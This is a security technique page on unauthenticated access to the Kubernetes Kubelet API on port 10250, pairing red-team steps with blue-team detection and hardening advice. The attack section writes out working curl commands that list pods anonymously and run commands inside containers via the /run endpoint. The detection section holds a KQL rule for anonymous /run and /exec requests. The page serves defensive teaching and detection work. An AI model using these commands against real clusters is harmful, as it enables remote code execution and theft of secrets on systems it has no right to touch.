# [IA-EXPLOIT-004]: Kubelet API Unauthorized Access

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-EXPLOIT-004 |
| **MITRE ATT&CK v18.1** | [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID / AKS (Azure Kubernetes Service) |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Kubernetes Kubelet agent runs on port **10250** on every node. If this port is exposed to the internet (or internal network) and configured with `--anonymous-auth=true`, attackers can interact with the API without credentials.
- **Attack Surface:** TCP Port 10250 (Kubelet API).
- **Business Impact:** **Full Cluster Compromise**. Attackers can list pods, execute commands inside containers (`/run`), and dump secrets.

## 3. PREREQUISITES & CONFIGURATION
- **Vulnerable Config:**
    - AKS or self-hosted cluster where port 10250 is exposed.
    - Kubelet configuration allows anonymous authentication (Default is `false` in modern AKS, but common in misconfigured self-hosted or older clusters).
- **Tools:**
    - `curl`
    - `kubeletctl`
    - `kubectl`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Discovery**
Scan for port 10250.

```bash
nmap -p 10250 [Target_IP_Range] --script http-methods
```

**Step 2: Exploitation (List Pods)**
Check if anonymous access allows listing pods.

```bash
curl -k https://[Target_IP]:10250/pods
```

**Step 3: Exploitation (RCE)**
Execute a command in a running container.

```bash
# Get the POST URL structure: /run/{namespace}/{pod}/{container}
curl -k -X POST "https://[IP]:10250/run/default/nginx-pod/nginx" -d "cmd=id"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Container Logs / Kubelet Logs
Monitor for access to sensitive endpoints by the `system:anonymous` user.

```json
{
  "verb": "create",
  "uri": "/run/default/nginx/nginx",
  "user": {
    "username": "system:anonymous",
    "groups": ["system:unauthenticated"]
  },
  "sourceIP": "attacker-ip"
}
```

#### 5.2 Sentinel (KQL)
```kusto
AKSAudit
| where user_username == "system:anonymous"
| where verb in ("create", "delete", "patch")
| where requestURI has "/run" or requestURI has "/exec"
| project TimeGenerated, SourceIP, RequestURI, Verb, ResponseStatus
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Configuration:** Ensure Kubelet starts with `--anonymous-auth=false`. In AKS, this is managed by Azure, but verify via `az aks show`.
*   **Authorization:** Enable `--authorization-mode=Webhook` so Kubelet queries the API server for permissions.
*   **Network:** Restrict access to port 10250. Use **Network Security Groups (NSGs)** to block all inbound traffic to 10250 except from the AKS Control Plane / API Server.

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-CLOUD-005] (Scanning for exposed ports)
> **Next Logical Step:** [LAT-CONTAINER-001] (Escape to Node / Host)
